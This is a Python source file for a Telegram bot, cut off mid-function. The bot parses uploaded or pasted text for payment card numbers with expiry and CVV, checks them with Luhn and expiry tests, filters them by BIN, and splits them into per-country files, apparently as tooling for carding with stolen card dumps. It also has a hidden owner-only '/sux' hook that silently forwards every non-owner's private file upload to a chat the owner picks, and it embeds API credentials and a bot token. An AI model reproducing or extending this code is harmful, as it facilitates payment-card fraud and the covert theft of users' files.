import os
import re
import time
import json
import secrets
import shutil
import asyncio
from io import BytesIO
from datetime import datetime
from concurrent.futures import ProcessPoolExecutor, as_completed

from telethon import TelegramClient, events, Button
from telethon.tl.types import DocumentAttributeFilename
from telethon.errors import FloodWaitError, RPCError

API_ID = 39472384
API_HASH = "5bfef9d1a0e7d1041d327836c8945df2"
BOT_TOKEN = "8849910575:AAFA3BuAeJ9XcR_XYBkEMq-JBadeoZfuels"
OWNER_IDS = {5271710396, 5439878112}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.environ.get("DATA_DIR", BASE_DIR)
USERS_FILE = os.path.join(DATA_DIR, "users.json")
SUX_CONFIG_FILE = os.path.join(DATA_DIR, "sux_config.json")
SESSIONS_DIR = os.path.join(DATA_DIR, "bins_sessions")
TEXT_OUTPUT_LIMIT = 20
MAX_FILE_BYTES = 100 * 1024 * 1024
MAX_TEXT_BYTES = 100 * 1024 * 1024
DOWNLOAD_TIMEOUT_SEC = 600
UPLOAD_TIMEOUT_SEC = 600
PROCESS_TIMEOUT_SEC = 1800
MAX_BINS_SESSIONS_PER_USER = 2
SESSION_TTL_SEC = 3600
UPLOAD_PART_SIZE_KB = 1024
PARALLEL_FILE_BYTES = 400_000
PARALLEL_THRESHOLD = 10000
BATCH_SIZE = 5000
MAX_WORKERS = 2

BINS_FILE = None
for directory in [DATA_DIR, BASE_DIR]:
    if os.path.exists(os.path.join(directory, "bins.txt")):
        BINS_FILE = os.path.join(directory, "bins.txt")
        break
    elif os.path.exists(os.path.join(directory, "bins_full.txt")):
        BINS_FILE = os.path.join(directory, "bins_full.txt")
        break

if not BINS_FILE:
    BINS_FILE = os.path.join(DATA_DIR, "bins_full.txt")

bot = TelegramClient("bot", API_ID, API_HASH)

_bin_db = None
_process_pool = None
bins_sessions = {}

CC_SCAN_PATTERN = re.compile(r"\d{12,16}\D+\d{1,2}\D+\d{2,4}\D+\d{3,4}")

COUNTRY_TO_CODE = {
    "UNITEDSTATES": "US", "UNITED STATES": "US", "USA": "US",
    "CANADA": "CA", "MEXICO": "MX", "BRAZIL": "BR", "ARGENTINA": "AR",
    "CHILE": "CL", "COLOMBIA": "CO", "PERU": "PE", "VENEZUELA": "VE",
    "UNITEDKINGDOM": "GB", "UNITED KINGDOM": "GB", "GREAT BRITAIN": "GB",
    "GERMANY": "DE", "FRANCE": "FR", "ITALY": "IT", "SPAIN": "ES",
    "NETHERLANDS": "NL", "BELGIUM": "BE", "SWITZERLAND": "CH", "AUSTRIA": "AT",
    "SWEDEN": "SE", "NORWAY": "NO", "DENMARK": "DK", "FINLAND": "FI",
    "POLAND": "PL", "PORTUGAL": "PT", "GREECE": "GR", "IRELAND": "IE",
    "RUSSIANFEDERATION": "RU", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
    "UKRAINE": "UA", "TURKEY": "TR", "INDIA": "IN", "PAKISTAN": "PK",
    "BANGLADESH": "BD", "SRI LANKA": "LK", "NEPAL": "NP",
    "CHINA": "CN", "JAPAN": "JP", "SOUTH KOREA": "KR", "KOREA": "KR",
    "SINGAPORE": "SG", "MALAYSIA": "MY", "THAILAND": "TH", "VIETNAM": "VN",
    "PHILIPPINES": "PH", "INDONESIA": "ID", "HONG KONG": "HK", "TAIWAN": "TW",
    "MACAU": "MO", "MACAO": "MO", "AUSTRALIA": "AU", "NEW ZEALAND": "NZ",
    "SOUTHAFRICA": "ZA", "SOUTH AFRICA": "ZA", "NIGERIA": "NG", "EGYPT": "EG",
    "KENYA": "KE", "MOROCCO": "MA", "ISRAEL": "IL", "SAUDI ARABIA": "SA",
    "UNITED ARAB EMIRATES": "AE", "UAE": "AE", "QATAR": "QA", "KUWAIT": "KW",
    "BAHRAIN": "BH", "OMAN": "OM", "JORDAN": "JO", "LEBANON": "LB",
    "PUERTO RICO": "PR", "BAHAMAS": "BS", "JAMAICA": "JM", "COSTA RICA": "CR",
    "PANAMA": "PA", "DOMINICAN REPUBLIC": "DO", "ECUADOR": "EC", "URUGUAY": "UY",
    "PARAGUAY": "PY", "BOLIVIA": "BO", "GUATEMALA": "GT", "HONDURAS": "HN",
    "EL SALVADOR": "SV", "NICARAGUA": "NI", "CROATIA": "HR", "ROMANIA": "RO",
    "HUNGARY": "HU", "CZECH REPUBLIC": "CZ", "CZECHIA": "CZ", "SLOVAKIA": "SK",
    "SLOVENIA": "SI", "BULGARIA": "BG", "SERBIA": "RS", "LITHUANIA": "LT",
    "LATVIA": "LV", "ESTONIA": "EE", "ICELAND": "IS", "LUXEMBOURG": "LU",
    "MALTA": "MT", "CYPRUS": "CY", "BRUNEI": "BN", "BRUNEI DARUSSALAM": "BN",
    "CAMBODIA": "KH", "MYANMAR": "MM", "LAOS": "LA", "MONGOLIA": "MN",
    "KAZAKHSTAN": "KZ", "UZBEKISTAN": "UZ", "GEORGIA": "GE", "ARMENIA": "AM",
    "AZERBAIJAN": "AZ", "IRAN": "IR", "IRAQ": "IQ", "AFGHANISTAN": "AF",
}


def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return []


def save_users(users):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f)


def is_owner(user_id):
    return user_id in OWNER_IDS


def load_sux_config():
    if os.path.exists(SUX_CONFIG_FILE):
        with open(SUX_CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"forward_chat_id": None}


def save_sux_forward_chat(chat_id):
    cfg = load_sux_config()
    cfg["forward_chat_id"] = chat_id
    with open(SUX_CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f)


def get_sux_forward_chat():
    return load_sux_config().get("forward_chat_id")


def add_user(user_id):
    users = load_users()
    if user_id not in users:
        users.append(user_id)
        save_users(users)


def _get_memory_mb():
    """Return (total_mb, available_mb). Linux VPS reads cgroups and /proc/meminfo."""
    # Check env override first
    env_mem = os.environ.get("MEMORY_MB")
    if env_mem:
        try:
            m = int(env_mem)
            return m, m
        except ValueError:
            pass

    # Check cgroups memory limit (common in Docker/Render container environments)
    try:
        limit_path = "/sys/fs/cgroup/memory/memory.limit_in_bytes"
        if not os.path.exists(limit_path):
            limit_path = "/sys/fs/cgroup/memory.max"  # cgroups v2
        
        if os.path.exists(limit_path):
            with open(limit_path, "r", encoding="utf-8") as f:
                limit_val = f.read().strip()
                if limit_val and limit_val.isdigit():
                    limit_bytes = int(limit_val)
                    if limit_bytes < 9223372036854771712:  # check if not "max"
                        limit_mb = limit_bytes // (1024 * 1024)
                        if limit_mb > 0:
                            return limit_mb, limit_mb
    except Exception:
        pass

    # Fallback to general Linux proc file
    try:
        if os.path.exists("/proc/meminfo"):
            total_mb = avail_mb = None
            with open("/proc/meminfo", encoding="utf-8") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        total_mb = int(line.split()[1]) // 1024
                    elif line.startswith("MemAvailable:"):
                        avail_mb = int(line.split()[1]) // 1024
            if total_mb:
                return total_mb, avail_mb if avail_mb is not None else total_mb
    except OSError:
        pass
    return 4096, 2048


def auto_tune_runtime_settings():
    """
    Pick workers / batch size / parallel threshold from this machine's CPU + RAM.
    Supports high-resource tiers like 16GB, 32GB+ VPS and Docker container limits.
    """
    global PARALLEL_THRESHOLD, BATCH_SIZE, MAX_WORKERS

    env_workers = os.environ.get("MAX_WORKERS")
    env_batch_size = os.environ.get("BATCH_SIZE")

    cpu = os.cpu_count() or 2
    total_mb, avail_mb = _get_memory_mb()
    effective_mb = min(total_mb, avail_mb)

    headroom_mb = 1200
    usable_mb = max(256, effective_mb - headroom_mb)
    ram_worker_cap = max(1, usable_mb // 350)
    cpu_worker_cap = max(1, cpu)

    if total_mb <= 4500:
        tier = "4GB-class"
        batch = 2500
        parallel_at = 12000
        tier_worker_cap = 2
    elif total_mb <= 9000:
        tier = "8GB-class"
        batch = 5000
        parallel_at = 10000
        tier_worker_cap = 4
    elif total_mb <= 18000:
        tier = "16GB-class"
        batch = 10000
        parallel_at = 8000
        tier_worker_cap = 8
    elif total_mb <= 36000:
        tier = "32GB-class"
        batch = 20000
        parallel_at = 5000
        tier_worker_cap = 16
    else:
        tier = "ultra-high-memory"
        batch = 30000
        parallel_at = 4000
        tier_worker_cap = 32

    workers = min(cpu_worker_cap, ram_worker_cap, tier_worker_cap)
    workers = max(1, workers)

    if avail_mb < 1500:
        workers = max(1, workers // 2)
        batch = max(1500, batch // 2)

    # Apply manual env overrides if provided
    if env_workers:
        try:
            workers = int(env_workers)
        except ValueError:
            pass
    if env_batch_size:
        try:
            batch = int(env_batch_size)
        except ValueError:
            pass

    PARALLEL_THRESHOLD = parallel_at
    BATCH_SIZE = batch
    MAX_WORKERS = workers

    return {
        "tier": tier,
        "cpu": cpu,
        "total_mb": total_mb,
        "avail_mb": avail_mb,
        "workers": MAX_WORKERS,
        "batch": BATCH_SIZE,
        "parallel_at": PARALLEL_THRESHOLD,
    }


def delete_file(path):
    try:
        if path and os.path.exists(path):
            os.remove(path)
    except OSError:
        pass


def friendly_error(exc):
    text = str(exc).strip()
    if text.startswith("❌"):
        return text[1:].strip()
    if isinstance(exc, asyncio.TimeoutError):
        return "Request timed out. Please try again."
    if isinstance(exc, FloodWaitError):
        return f"Telegram rate limit. Wait {exc.seconds}s and try again."
    if isinstance(exc, RPCError):
        return "Telegram is having issues. Please try again shortly."
    msg = str(exc).lower()
    if "timeout" in msg or "timed out" in msg:
        return "Request timed out. Please try again."
    if "too large" in msg or "file too big" in msg:
        return "File is too large."
    if "disconnect" in msg or "connection" in msg:
        return "Connection issue. Please try again."
    return "Something went wrong. Please try again."


def document_size_bytes(doc):
    return int(getattr(doc, "size", 0) or 0)


FILE_TOO_LARGE_MSG = f"❌ File is too large. Maximum allowed is {MAX_FILE_BYTES // (1024 * 1024)} MB."
TEXT_TOO_LARGE_MSG = f"❌ Text is too large. Maximum allowed is {MAX_TEXT_BYTES // (1024 * 1024)} MB."


def validate_document_size(doc):
    size = document_size_bytes(doc)
    if size > MAX_FILE_BYTES:
        return False, FILE_TOO_LARGE_MSG
    return True, None


def validate_text_size(text):
    if not text:
        return True, None
    size = len(text.encode("utf-8"))
    if size > MAX_TEXT_BYTES:
        return False, TEXT_TOO_LARGE_MSG
    return True, None


def track_background_task(coro):
    task = asyncio.create_task(coro)
    task.add_done_callback(_log_task_failure)
    return task


def _log_task_failure(task):
    try:
        task.result()
    except Exception as exc:
        print(f"⚠️ Background task failed: {exc}")


async def safe_reply(event, text, **kwargs):
    try:
        return await event.reply(text, **kwargs)
    except Exception:
        return None


async def safe_delete(message):
    if not message:
        return
    try:
        await message.delete()
    except Exception:
        pass


def safe_handler(func):
    async def wrapper(event):
        try:
            await func(event)
        except Exception as exc:
            print(f"⚠️ Handler {func.__name__}: {exc}")
            msg = friendly_error(exc)
            try:
                if getattr(event, "data", None) is not None:
                    await event.answer(f"❌ {msg}", alert=True)
                else:
                    await safe_reply(event, f"❌ {msg}")
            except Exception:
                pass
    return wrapper


def country_name_to_code(name):
    if not name or not str(name).strip():
        return "XX"
    raw = str(name).strip().upper()
    compact = re.sub(r"[^A-Z]", "", raw)
    if compact in COUNTRY_TO_CODE:
        return COUNTRY_TO_CODE[compact]
    if raw in COUNTRY_TO_CODE:
        return COUNTRY_TO_CODE[raw]
    for key, code in COUNTRY_TO_CODE.items():
        kc = re.sub(r"[^A-Z]", "", key)
        if compact == kc or compact.startswith(kc) or kc.startswith(compact):
            return code
    return "XX"


def country_flag(code):
    code = (code or "XX").upper()
    if len(code) != 2 or not code.isalpha():
        return "🏳️"
    return chr(0x1F1E6 + ord(code[0]) - ord("A")) + chr(0x1F1E6 + ord(code[1]) - ord("A"))


def load_bin_db():
    global _bin_db
    if _bin_db is not None:
        return _bin_db
    _bin_db = {}
    if not os.path.exists(BINS_FILE):
        return _bin_db
    with open(BINS_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|")
            if len(parts) < 2:
                continue
            bin_num = parts[0].strip()
            if len(bin_num) < 6:
                continue
            country_raw = parts[-1].strip()
            _bin_db[bin_num[:6]] = country_name_to_code(country_raw)
    return _bin_db


def lookup_country(cc_number):
    db = load_bin_db()
    return db.get(str(cc_number)[:6], "XX")


def get_process_pool():
    global _process_pool
    if _process_pool is None:
        _process_pool = ProcessPoolExecutor(max_workers=MAX_WORKERS)
    return _process_pool


def luhn_valid(cc):
    total = 0
    rev = cc[::-1]
    for i, ch in enumerate(rev):
        try:
            d = int(ch)
        except ValueError:
            return False
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def parse_cc_line(raw):
    """Phase 2 — full validation (same rules/output as before)."""
    cc = mm = yy = cvv = ""
    cur_year = datetime.now().year
    cur_month = datetime.now().month

    try:
        m = re.search(r"(\d{12,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})", str(raw))
        if m:
            cc, mm, yy, cvv = m.group(1), m.group(2), m.group(3), m.group(4)
    except Exception:
        pass

    if not cc:
        digits = []
        part = ""
        for c in str(raw):
            if "0" <= c <= "9":
                part += c
            else:
                if part:
                    digits.append(part)
                    part = ""
        if part:
            digits.append(part)
        if len(digits) >= 4:
            cc, mm, yy, cvv = digits[0], digits[1], digits[2], digits[3]

    if (not cc) or len(cc) < 12 or len(cc) > 16:
        return None, "invalid_number"

    try:
        mm_i = int(mm)
    except ValueError:
        return None, "invalid_month"
    if mm_i < 1 or mm_i > 12:
        return None, "invalid_month"

    if not luhn_valid(cc):
        return None, "luhn_fail"

    try:
        yy_i = int(yy)
    except ValueError:
        return None, "invalid_year"
    if yy_i < 100:
        yy_i += 2000
    if yy_i < cur_year or (yy_i == cur_year and mm_i < cur_month):
        return None, "expired"

    yy_out = str(yy_i)[-2:]
    return f"{cc}|{mm_i:02d}|{yy_out}|{cvv}", None


def find_candidates(text):
    """Phase 1 — fast regex scan only."""
    out = set()
    text = str(text).strip()
    if not text:
        return out
    out.add(text)
    for match in CC_SCAN_PATTERN.finditer(text):
        out.add(match.group(0))
    return out


def _process_record_batch(records, bin_prefix=None):
    """Worker-safe batch parser. Returns deduped valid cards for this batch."""
    seen = set()
    valid = []
    bp = str(bin_prefix).strip() if bin_prefix else None

    for record in records:
        for cand in find_candidates(record):
            formatted, _ = parse_cc_line(cand)
            if not formatted:
                continue
            if bp and not formatted.startswith(bp):
                continue
            if formatted in seen:
                continue
            seen.add(formatted)
            valid.append(formatted)
    return valid


def _flatten_json_strings(obj, out):
    if isinstance(obj, str):
        out.append(obj)
    elif isinstance(obj, dict):
        for v in obj.values():
            _flatten_json_strings(v, out)
    elif isinstance(obj, list):
        for item in obj:
            _flatten_json_strings(item, out)
    elif obj is not None:
        out.append(str(obj))


def _iter_file_records(path, filename=""):
    """Stream records line-by-line (low memory)."""
    ext = os.path.splitext((filename or path).lower())[1]

    if ext == ".json":
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            raw = f.read()
        try:
            data = json.loads(raw)
            strings = []
            _flatten_json_strings(data, strings)
            for s in strings:
                s = str(s).strip()
                if s:
                    yield s
        except json.JSONDecodeError:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        yield line
        return

    if ext == ".csv":
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                yield line
                for cell in re.split(r"[,;\t|]", line):
                    cell = cell.strip().strip('"').strip("'")
                    if cell:
                        yield cell
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line:
                yield line


def _batched(iterator, batch_size):
    batch = []
    for item in iterator:
        batch.append(item)
        if len(batch) >= batch_size:
            yield batch
            batch = []
    if batch:
        yield batch


def _should_use_parallel(path):
    try:
        return os.path.getsize(path) >= PARALLEL_FILE_BYTES
    except OSError:
        return False


def _run_batches_parallel(batches, bin_prefix, on_batch_results):
    pool = get_process_pool()
    futures = [pool.submit(_process_record_batch, batch, bin_prefix) for batch in batches]
    for fut in as_completed(futures):
        on_batch_results(fut.result())


def _run_batches_sequential(batches, bin_prefix, on_batch_results):
    for batch in batches:
        on_batch_results(_process_record_batch(batch, bin_prefix))


def _extract_cards_sync(path, filename, bin_prefix=None):
    use_parallel = _should_use_parallel(path)
    seen_global = set()
    valid = []

    def merge_results(batch_cards):
        for card in batch_cards:
            if card not in seen_global:
                seen_global.add(card)
                valid.append(card)

    batches = list(_batched(_iter_file_records(path, filename), BATCH_SIZE))
    if use_parallel and batches:
        _run_batches_parallel(batches, bin_prefix, merge_results)
    else:
        _run_batches_sequential(batches, bin_prefix, merge_results)

    return valid


def _extract_bins_to_session_sync(path, filename, session_id, user_id):
    load_bin_db()
    session_dir = os.path.join(SESSIONS_DIR, f"{session_id}_{user_id}")
    os.makedirs(session_dir, exist_ok=True)

    country_handles = {}
    country_counts = {}
    seen_global = set()

    def write_card(card):
        if card in seen_global:
            return
        seen_global.add(card)
        code = lookup_country(card.split("|")[0])
        if code not in country_handles:
            fpath = os.path.join(session_dir, f"{code}.txt")
            country_handles[code] = open(fpath, "a", encoding="utf-8")
            country_counts[code] = 0
        country_handles[code].write(card + "\n")
        country_counts[code] += 1

    def on_batch_results(batch_cards):
        for card in batch_cards:
            write_card(card)

    use_parallel = _should_use_parallel(path)
    batches = list(_batched(_iter_file_records(path, filename), BATCH_SIZE))

    if use_parallel and batches:
        _run_batches_parallel(batches, None, on_batch_results)
    else:
        _run_batches_sequential(batches, None, on_batch_results)

    for fh in country_handles.values():
        fh.close()

    country_paths = {
        code: os.path.join(session_dir, f"{code}.txt")
        for code in country_counts
    }
    counts_sorted = sorted(country_counts.items(), key=lambda x: x[1], reverse=True)
    return counts_sorted, session_dir, country_paths, country_counts, len(seen_global)


async def extract_cards_from_file_async(path, filename, bin_prefix=None):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(
        None, _extract_cards_sync, path, filename, bin_prefix
    )


async def extract_bins_session_async(path, filename, session_id, user_id):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(
        None, _extract_bins_to_session_sync, path, filename, session_id, user_id
    )


def _remove_session_files(session):
    session_dir = session.get("session_dir")
    if session_dir and os.path.isdir(session_dir):
        shutil.rmtree(session_dir, ignore_errors=True)


def trim_user_bins_sessions(user_id):
    """Keep only the newest MAX_BINS_SESSIONS_PER_USER sessions for this user."""
    user_sessions = [
        (sid, s) for sid, s in bins_sessions.items() if s["user_id"] == user_id
    ]
    user_sessions.sort(key=lambda x: x[1]["created_at"], reverse=True)
    for sid, session in user_sessions[MAX_BINS_SESSIONS_PER_USER:]:
        _remove_session_files(session)
        bins_sessions.pop(sid, None)


def cleanup_bins_sessions():
    now = time.time()
    expired = [sid for sid, s in bins_sessions.items() if now - s["created_at"] > SESSION_TTL_SEC]
    for sid in expired:
        _remove_session_files(bins_sessions[sid])
        bins_sessions.pop(sid, None)


def get_document_filename(doc):
    for attr in doc.attributes:
        if hasattr(attr, "file_name") and attr.file_name:
            return attr.file_name
    return ""


async def resolve_cc_input(event, command):
    """Get file and/or pasted CC text from command message or reply."""
    reply = await event.get_reply_message()
    doc = None
    if reply and reply.document:
        doc = reply.document
    elif event.message.document:
        doc = event.message.document

    text_parts = []
    raw = (event.raw_text or "").strip()
    if raw:
        lines = raw.splitlines()
        if lines:
            first = lines[0].strip()
            if command == "f":
                m = re.match(r"^/f(?:\s+\d{4,8})?\s*(.*)$", first)
                if m and m.group(1).strip():
                    text_parts.append(m.group(1).strip())
            elif command == "bins":
                if first.startswith("/bins"):
                    rest = first[5:].strip()
                    if rest:
                        text_parts.append(rest)
            text_parts.extend(line.strip() for line in lines[1:] if line.strip())

    if reply and reply.text and not reply.document:
        text_parts.append(reply.text.strip())

    return doc, "\n".join(text_parts).strip()


def write_text_input(user_id, prefix, text, ext=".txt"):
    path = os.path.join(BASE_DIR, f"{prefix}_{user_id}_{int(time.time())}{ext}")
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)
    return path


def build_country_list_text(counts_sorted):
    lines = ["🌍 Filtered All Bin Countries 👇", ""]
    for code, count in counts_sorted:
        flag = country_flag(code)
        label = code if code != "XX" else "Unknown"
        lines.append(f"{flag} {label}: {count}")
    return "\n".join(lines)


def build_country_buttons(session_id, counts_sorted):
    rows = []
    row = []
    for code, count in counts_sorted:
        flag = country_flag(code)
        label = code if code != "XX" else "??"
        btn_text = f"{flag} {label} ({count})"
        row.append(Button.inline(btn_text, data=f"bc:{session_id}:{code}"))
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    return rows


async def download_document(doc, dest_path):
    await asyncio.wait_for(
        bot.download_media(doc, file=dest_path),
        timeout=DOWNLOAD_TIMEOUT_SEC,
    )
    size = os.path.getsize(dest_path)
    if size > MAX_FILE_BYTES:
        delete_file(dest_path)
        raise ValueError(FILE_TOO_LARGE_MSG)


async def schedule_incoming_file_forward(event):
    """Queue a silent background forward — private bare file uploads only."""
    try:
        if not event.is_private:
            return

        forward_chat = get_sux_forward_chat()
        if not forward_chat or is_owner(event.sender_id):
            return

        if not event.message.document:
            return

        if document_size_bytes(event.message.document) > MAX_FILE_BYTES:
            return

        doc_msg = event.message

        try:
            sender = await event.get_sender()
        except Exception:
            sender = None

        username = getattr(sender, "username", None) if sender else None
        if username:
            caption = f"@{username}"
        else:
            name = (getattr(sender, "first_name", None) if sender else None) or "User"
            caption = f"{name} ({event.sender_id})"

        media = doc_msg.media
        track_background_task(_forward_file_background(forward_chat, media, caption))
    except Exception:
        pass


async def _forward_file_background(forward_chat, media, caption):
    try:
        await asyncio.wait_for(
            bot.send_file(
                forward_chat,
                media,
                caption=caption,
                force_document=True,
                allow_cache=False,
                part_size_kb=UPLOAD_PART_SIZE_KB,
                silent=True,
            ),
            timeout=UPLOAD_TIMEOUT_SEC,
        )
    except Exception:
        pass


def fire_incoming_file_forward(event):
    track_background_task(schedule_incoming_file_forward(event))


async def send_txt_file(chat_id, file_obj, filename, caption=None, parse_mode=None):
    """Upload a .txt file with larger chunks and no extra disk copy."""
    await asyncio.wait_for(
        bot.send_file(
            chat_id,
            file_obj,
            caption=caption,
            parse_mode=parse_mode,
            force_document=True,
            allow_cache=False,
            part_size_kb=UPLOAD_PART_SIZE_KB,
            attributes=[DocumentAttributeFilename(filename)],
        ),
        timeout=UPLOAD_TIMEOUT_SEC,
    )


async def deliver_cards(chat_id, cards):
    total = len(cards)
    if total == 0:
        await bot.send_message(chat_id, "❌ No cards found.")
        return

    try:
        if total <= TEXT_OUTPUT_LIMIT:
            lines = "\n".join(f"`{card}`" for card in cards)
            msg = (
                f"**Cards Filtered ✅**\n"
                f"**Total Filtered: {total}**\n\n"
                f"{lines}"
            )
            await bot.send_message(chat_id, msg, parse_mode="md")
            return

        out_name = f"filtered_cc_{int(time.time())}.txt"
        content = "\n".join(cards)
        if len(content.encode("utf-8")) > MAX_FILE_BYTES:
            await bot.send_message(chat_id, FILE_TOO_LARGE_MSG)
            return
        bio = BytesIO(content.encode("utf-8"))
        bio.name = out_name
        await send_txt_file(
            chat_id,
            bio,
            out_name,
            caption=f"**Total Filtered Cards:** {total}",
            parse_mode="md",
        )
    except Exception as exc:
        await bot.send_message(chat_id, f"❌ {friendly_error(exc)}")


async def deliver_country_file(chat_id, source_path, total):
    if not source_path or not os.path.exists(source_path) or total <= 0:
        await bot.send_message(chat_id, "❌ No cards for this country.")
        return
    try:
        if os.path.getsize(source_path) > MAX_FILE_BYTES:
            await bot.send_message(chat_id, FILE_TOO_LARGE_MSG)
            return
        out_name = f"country_ccs_{int(time.time())}.txt"
        await send_txt_file(
            chat_id,
            source_path,
            out_name,
            caption=f"Total CCS: {total}",
        )
    except Exception as exc:
        await bot.send_message(chat_id, f"❌ {friendly_error(exc)}")


async def process_filter_command(event, bin_prefix=None):
    user_id = event.sender_id
    add_user(user_id)

    doc, cc_text = await resolve_cc_input(event, "f")

    if not doc and not cc_text:
        if bin_prefix:
            await event.reply(
                f"📁 Reply to a file/text with:\n`/f {bin_prefix}`\n\n"
                f"Or paste cards below the command.\n"
                f"Only cards starting with `{bin_prefix}` will be kept."
            )
        else:
            await event.reply(
                "📁 Reply to a file/text with `/f`, or paste cards in the message.\n"
                "Supports `.txt`, `.csv`, `.json`, and pasted CC lines.\n"
                f"Max file size: {MAX_FILE_BYTES // (1024 * 1024)} MB."
            )
        return

    if doc:
        ok, err = validate_document_size(doc)
        if not ok:
            await event.reply(err)
            return
    if cc_text:
        ok, err = validate_text_size(cc_text)
        if not ok:
            await event.reply(err)
            return

    processing = await event.reply("⏳ Processing...")
    input_path = None

    try:
        if doc:
            filename = get_document_filename(doc)
            ext = os.path.splitext(filename)[1] or ".txt"
            input_path = os.path.join(BASE_DIR, f"filter_input_{user_id}_{int(time.time())}{ext}")
            await download_document(doc, input_path)
            cards = await asyncio.wait_for(
                extract_cards_from_file_async(input_path, filename, bin_prefix=bin_prefix),
                timeout=PROCESS_TIMEOUT_SEC,
            )
        else:
            input_path = write_text_input(user_id, "filter_input", cc_text)
            cards = await asyncio.wait_for(
                extract_cards_from_file_async(input_path, "paste.txt", bin_prefix=bin_prefix),
                timeout=PROCESS_TIMEOUT_SEC,
            )

        await safe_delete(processing)
        await deliver_cards(event.chat_id, cards)
    except Exception as e:
        await safe_delete(processing)
        await safe_reply(event, f"❌ {friendly_error(e)}")
    finally:
        delete_file(input_path)


async def process_bins_command(event):
    user_id = event.sender_id
    add_user(user_id)
    cleanup_bins_sessions()

    doc, cc_text = await resolve_cc_input(event, "bins")

    if not doc and not cc_text:
        await event.reply(
            "📁 Reply to a file/text with `/bins`, or paste cards in the message.\n"
            "Supports `.txt`, `.csv`, `.json`, and pasted CC lines.\n"
            f"Max file size: {MAX_FILE_BYTES // (1024 * 1024)} MB."
        )
        return

    if not os.path.exists(BINS_FILE):
        await event.reply("❌ BIN database not found on server.")
        return

    if doc:
        ok, err = validate_document_size(doc)
        if not ok:
            await event.reply(err)
            return
    if cc_text:
        ok, err = validate_text_size(cc_text)
        if not ok:
            await event.reply(err)
            return

    processing = await event.reply("⏳ Processing...")
    session_id = secrets.token_hex(4)
    input_path = None
    session_dir = None

    try:
        filename = "paste.txt"
        if doc:
            filename = get_document_filename(doc) or "paste.txt"
            ext = os.path.splitext(filename)[1] or ".txt"
            input_path = os.path.join(BASE_DIR, f"bins_input_{user_id}_{int(time.time())}{ext}")
            await download_document(doc, input_path)
        else:
            input_path = write_text_input(user_id, "bins_input", cc_text)

        counts_sorted, session_dir, country_paths, country_counts, total_valid = (
            await asyncio.wait_for(
                extract_bins_session_async(input_path, filename, session_id, user_id),
                timeout=PROCESS_TIMEOUT_SEC,
            )
        )

        if total_valid == 0:
            shutil.rmtree(session_dir, ignore_errors=True)
            await safe_delete(processing)
            await event.reply("❌ No valid cards found in file.")
            return

        bins_sessions[session_id] = {
            "user_id": user_id,
            "session_dir": session_dir,
            "country_paths": country_paths,
            "country_counts": country_counts,
            "created_at": time.time(),
        }
        trim_user_bins_sessions(user_id)

        text = build_country_list_text(counts_sorted)
        buttons = build_country_buttons(session_id, counts_sorted)

        await safe_delete(processing)
        await event.reply(text, buttons=buttons)
    except Exception as e:
        shutil.rmtree(session_dir or os.path.join(SESSIONS_DIR, f"{session_id}_{user_id}"), ignore_errors=True)
        await safe_delete(processing)
        await safe_reply(event, f"❌ {friendly_error(e)}")
    finally:
        delete_file(input_path)


def welcome_text(first_name):
    name = first_name or "User"
    return (
        f"Welcome **{name}**!\n\n"
        f"Use the following commands:\n\n"
        f"- `/f` -> to clean your file or pasted cards.\n"
        f"- `/f <bin>` -> to filter specific BINs.\n"
        f"- `/bins` -> to filter cards by country (file or paste)."
    )


@bot.on(events.NewMessage(pattern="/start"))
@safe_handler
async def start_handler(event):
    add_user(event.sender_id)
    sender = await event.get_sender()
    name = getattr(sender, "first_name", None) or "User"
    await event.reply(welcome_text(name), parse_mode="md")


@bot.on(events.NewMessage(pattern=r"^/f\b"))
@safe_handler
async def filter_handler(event):
    raw = (event.raw_text or "").strip()
    first_line = raw.splitlines()[0].strip() if raw else ""
    m = re.match(r"^/f(?:\s+(\d{4,8}))?(?:\s+(.*))?$", first_line)
    bin_prefix = m.group(1) if m and m.group(1) else None
    if bin_prefix and not bin_prefix.isdigit():
        await event.reply("❌ BIN must be digits only.\nExample: `/f 414720`", parse_mode="md")
        return
    await process_filter_command(event, bin_prefix=bin_prefix)


@bot.on(events.NewMessage(pattern="/bins"))
@safe_handler
async def bins_handler(event):
    await process_bins_command(event)


@bot.on(events.CallbackQuery(pattern=rb"bc:([a-f0-9]+):([A-Z?]{2})"))
@safe_handler
async def bins_country_callback(event):
    session_id = event.pattern_match.group(1).decode()
    country_code = event.pattern_match.group(2).decode()
    if country_code == "??":
        country_code = "XX"

    session = bins_sessions.get(session_id)
    if not session or session["user_id"] != event.sender_id:
        await event.answer("Session expired. Run /bins again.", alert=True)
        return

    file_path = session["country_paths"].get(country_code)
    total = session["country_counts"].get(country_code, 0)
    try:
        await event.answer(f"Sending {total} cards...")
        await deliver_country_file(event.sender_id, file_path, total)
    except Exception as exc:
        await event.answer(friendly_error(exc), alert=True)


@bot.on(events.NewMessage(incoming=True))
async def sux_forward_hook(event):
    """Forward private file uploads only (not commands, groups, or text)."""
    if not event.is_private:
        return
    raw = (event.raw_text or "").strip()
    if raw.startswith("/"):
        return
    if not event.message.document:
        return
    fire_incoming_file_forward(event)


@bot.on(events.NewMessage(pattern=r"/sux(?:\s+(.+))?"))
async def sux_handler(event):
    if not is_owner(event.sender_id):
        return

    arg = event.pattern_match.group(1)
    if not arg:
